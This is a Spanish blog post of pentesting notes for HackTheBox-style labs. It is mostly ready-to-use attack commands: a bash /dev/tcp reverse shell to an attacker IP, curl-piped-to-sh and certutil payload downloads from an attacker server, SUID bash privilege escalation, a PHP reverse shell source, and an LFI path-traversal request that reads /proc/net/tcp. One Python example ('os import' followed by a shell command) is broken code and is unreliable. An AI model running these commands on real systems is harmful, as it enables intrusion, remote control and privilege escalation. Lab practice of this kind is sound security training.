---
layout: single
title: Notas de Pentesting
excerpt: "En esta ocasión, voy a mostrar unas cosillas que nos pueden ser útiles para nuestras pruebas de penetración. Puedes probarlas cuando estés en HackTheBox o no se, incluso, en Active Directory."
date: 2023-03-13
classes: wide
header:
  teaser: /assets/images/pentestingNotes/notasHacker.webp
  teaser_home_page: true
  icon: /assets/images/notas.png
categories:
  - Pentesting Notes
  - Learning
tags:
  - Linux
  - Windows
  - Shell
  - Reverse Shell
  - Exploits
  - Escalada de Privilegios
---
![](/assets/images/pentestingNotes/notasHacker.webp)

En esta ocasión, voy a mostrar unas cosillas que nos pueden ser útiles para nuestras pruebas de penetración. Puedes probarlas cuando estés en HackTheBox o no se, incluso, en Active Directory.


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Linux">Linux</a></li>
			<ul>
				<li><a href="#Shell">Shell Interactiva de Bash</a></li>
				<li><a href="#Bash">Conectarse Remotamente con Bash</a></li>
				<li><a href="#Descarga">Descargando una Archivo en Máquina Victima con Linux</a></li>
				<li><a href="#Escalar">Escalar Privilegios con Chmod</a></li>
				<li><a href="#Escalar2">Escalar Privilegios con Binarios SUID</a></li>
			</ul>
		<li><a href="#Windows">Windows</a></li>
			<ul>
				<li><a href="#Certutil">Descargar Archivos con Certutil Windows</a></li>
				<li><a href="#Privilegio">Abusar del Privilegio SeImpersonatePrivilege Windows</a></li>
				<li><a href="#Suggester">Herramienta Windows Suggester</a></li>
			</ul>
		<li><a href="#Reverse">Reverse Shells</a></li>
			<ul>
				<li><a href="#Reverse">Reverse Shell de PHP</a></li>
			</ul>
		<li><a href="#Web">Tips para Pentesting Web</a></li>
			<ul>
                                <li><a href="#CURL">Enumerando Puertos Internos con CURL</a></li>
                        </ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Linux" style="text-align:center;">Linux</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>

<h2 id="Shell">Shell Interactiva de Bash</h2>

Obtuviste acceso a una máquina, pero ¿quieres tener una terminal más interactiva de bash? Has lo siguiente:
* Escribe el siguiente comando:
```
script /dev/null -c bash
```
* Presiona las teclas **ctrl + z**, debería aparecer el siguiente mensaje y luego la terminal de tu máquina:
```
zsh: suspended  nc -nvlp 443
```
* Ahora escribe el siguiente comando en tu máquina:
```
 stty raw -echo; fg       
[1]  + continued  nc -nvlp 443
```
* Escribe **reset** y te preguntará que tipo de terminal quieres, pon **xterm**:
```
[1]  + continued  nc -nvlp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```
* Exportemos **xterm**, **bash** y cambiemos el tamaño de la terminal (este último es opcional, pero lo recomiendo):
```
www-data@bashed:/var/www/html/dev$ export TERM=xterm
www-data@bashed:/var/www/html/dev$ export SHELL=bash
www-data@bashed:/var/www/html/dev$ stty rows 51 columns 189
```
Y listo, ya tenemos nuestra terminal interactiva.

<h2 id="Bash">Conectarse Remotamente con Bash</h2>

Esta es una forma simple de conectarse remotamente en una máquina que usa Linux.

* Vamos a usar el siguiente script:
```
bash -c "bash -i >& /dev/tcp/Tu_IP/443 0>&1"
```
* Si lo necesitas para una página web, debes **url encodearlo** cambiando los ampersands por **%26**.
```
bash -c "bash -i >%26 /dev/tcp/Tu_IP/443 0>%261"
```

<h2 id="Descarga">Descargando una Archivo en Máquina Victima con Linux</h2>

Hay varias formas en las que podemos descargar o usar un archivo en una máquina Linux, aquí algunos ejemplos:
* Primero, vamos a levantar un servidor en Python:
```
python3 -m http.server   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* Ahora descargamos el archivo, como ejemplo usaremos la Reverse Shell de PHP:
```
wget Tu_IP:8000/php-reverse-shell.php
```
* O bien, si queremos usar un archivo como **linpeas.h**, aquí usamos el puerto 80 del servidor de Python:
```
curl 10.10.14.16:80/linpeas.sh | sh
```

<h2 id="Escalar">Escalar Privilegios con Chmod</h2>

¿Quieres escalar privilegios de forma sencilla? Usa **chmod** para hacerlo, aquí un par de ejemplos:
* Si tienes privilegios como SUDO para **chmod**, solamente escribe el siguiente comando:
```
chmod u+s /bin/bash
```
* Si lo necesitas para un script en Python, solo escribe:
```
os import
chmod u+s /bin/bash
```
* Ahora, escala privilegios con bash:
```
ejemplo@test:$ bash -p
bash-4.3# whoami
root
```

<h2 id="Escalar2">Escalar Privilegios con Binarios SUID</h2>

Este blog, en inglés, explica algunas formas en las que puedes escalar privilegios, recomiendo que lo veas:
* https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Windows" style="text-align:center;">Windows</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Certutil">Descargar Archivos con Certutil Windows</h2>

¿Necesitas descargar archivos en una máquina víctima que usa Windows? Has lo siguiente:
* En tu máquina, abre un servidor en Python en donde tengas el archivo que quieras cargar:
```
python3 -m http.server                                                                     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
* Ve al directorio **/Temp** de la máquina Windows y crea una carpeta que se llame **/privesc**:
```
c:\>cd Windows/Temp
cd Windows/Temp
c:\Windows\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C03-76A8
 Directory of c:\Windows\Temp
c:\Windows\Temp>mkdir Privesc
mkdir Privesc
c:\Windows\Temp>cd Privesc
cd Privesc
```
* Ahora dentro de **/Privesc** vamos a cargar el archivo que deseas con **Certutil**:
```
c:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://Tu_IP:8000/Archivo_que_quieres_cargar Nuevo_Nombre
```
Ejemplo:
```
c:\Windows\Temp\Privesc>certutil.exe -urlcache -split -f http://IP_Mia_xd:8000/MS10-059.exe MS10-059.exe
```

<h2 id="Privilegio">Abusar del Privilegio SeImpersonatePrivilege Windows</h2>

Si bien, hay Exploits para casi todo, podemos usar una herramienta para cuando te topes con este privilegio en una máquina Windows.

Usaremos **Juicy Potato**, aquí un link de como usarlo:
* https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/

Si necesitas **Juicy Potato** para versiones viejas de Windows, aquí te pongo esta versión del **Juicy** llamada **Churrasco**:
* https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/

<h2 id="Suggester">Herramienta Windows Suggester</h2>

Esta herramienta nos sirve para ver a que Exploits es vulnerable la máquina Windows, para esto, necesitamos saber unas cosillas:
* Primero necesitamos descargarla: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
* Una vez descargada, seguimos las instrucciones del GitHub para generar una base de datos en archivo **.xls**:
```
python2 windows-exploit-suggester.py --update
[*] initiating winsploit version 3.3...
[+] writing to file 2023-03-30-mssb.xls
[*] done
```
* Dentro de la máquina víctima, necesitamos la información del sistema:
```
systeminfo
```
* Guarda todo lo del **systeminfo** en un archivo **.txt**:
```
nano sysinfo.txt
```
* Ahora usa la herramienta, usando el archivo **.txt** y el archivo **.xls**:
```
python2 windows-exploit-suggester.py --database 2023-03-30-mssb.xls -i sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*] there are now 246 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2012 R2 64-bit'
[*] 
[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
...
```
* Si no funciona la herramienta, has lo siguiente:
```
pip2 install xlrd==1.2.0
```

<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Reverse" style="text-align:center;">Reverse Shells</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font>
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>

<h2 id="Reverse">Reverse Shell de PHP</h2>

¿Necesitas una **Reverse Shell** que sea hecha en PHP? Aquí tienes una:
* https://github.com/pentestmonkey/php-reverse-shell

* Así puedes clonarla:
```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
Clonando en 'php-reverse-shell'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
Recibiendo objetos: 100% (10/10), 9.81 KiB | 1.23 MiB/s, listo.
Resolviendo deltas: 100% (2/2), listo.
```
* Recuerda que debes abrir el archivo y modificarlo para poner tu IP y un puerto que quieras.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Web" style="text-align:center;">Tips para Pentesting Web</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font>
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="CURL">Enumerando Puertos Internos con CURL</h2>

Digamos que tienes la forma de visualizar archivos internos de una máquina desde una aplicación web o página web, gracias a la inyección de comandos por LFI. Si puedes visualizar el archivo **tcp** del directorio **/proc/net**, puedes descubrir que puertos internos estan abiertos utilizando la herramienta **CURL**.

Para hacerlo, obtengamos una petición por el metodo GET con el parámetro **-X**. Como prueba, usaremos la **máquina Tabby**:

```
curl -s -X GET "http://megahosting.htb/news.php?file=../../../../../../../proc/net/tcp"
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000   997        0 24968 1 0000000000000000 100 0 0 10 0                     
   1: 00000000:0050 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 22923 1 0000000000000000 100 0 0 10 0                     
   2: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 21938 1 0000000000000000 100 0 0 10 0                     
   3: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 22903 1 0000000000000000 100 0 0 10 0                     
   4: C20A0A0A:0050 040E0A0A:B7D2 01 00000000:00000000 02:000AFC7F 00000000    33        0 32297 2 0000000000000000 166 4 30 10 21                   
   5: C20A0A0A:86BA 01010101:0035 02 00000001:00000000 01:000002E0 00000003   101        0 36768 2 0000000000000000 800 0 0 1 7
```
Vamos a usar solamente la columna del **local_address**, si la quieres seleccionar, presiona **ctrl + alt** y selecciona solo los resultados de esa columna (esto funciona en Kali, no se si funciona en otros SO) y reproduce el resultado con **echo**:
```
echo "00000000:1F90                                                               
00000000:0050        
3500007F:0035        
00000000:0016        
C20A0A0A:0050        
C20A0A0A:86BA"
00000000:1F90        
00000000:0050        
3500007F:0035        
00000000:0016        
C20A0A0A:0050        
C20A0A0A:86BA
```
Vamos a quedarnos solo con los números que estan después de los ":", usaremos **awk** para obtener ese resultado y con **sort** vamos a ordenarlos:
```
echo "00000000:1F90        
00000000:0050        
3500007F:0035        
00000000:0016        
C20A0A0A:0050        
C20A0A0A:86BA" | awk '{print $2}' FS=":" | sort -u
0016        
0035        
0050        
1F90        
86BA
```
Resulta que estos números que obtuvimos, son hexadecimales y estan en little endian, por lo que si usamos una terminal de Python y los ponemos en su formato correspondiente, obtenedremos el número de un puerto:
```
python3                                                             
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> 0x0016
22
>>> 0x0035
53
>>> 0x0050
80
>>> 0x1F90
8080
>>> 0x86BA
34490
>>> exit()
```
Y listo, ya enumerate puertos internos de una máquina.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* https://github.com/pentestmonkey/php-reverse-shell
* https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
* https://binaryregion.wordpress.com/2021/06/14/privilege-escalation-windows-juicypotato-exe/
* https://binaryregion.wordpress.com/2021/08/04/privilege-escalation-windows-churrasco-exe/



<br>
# FIN
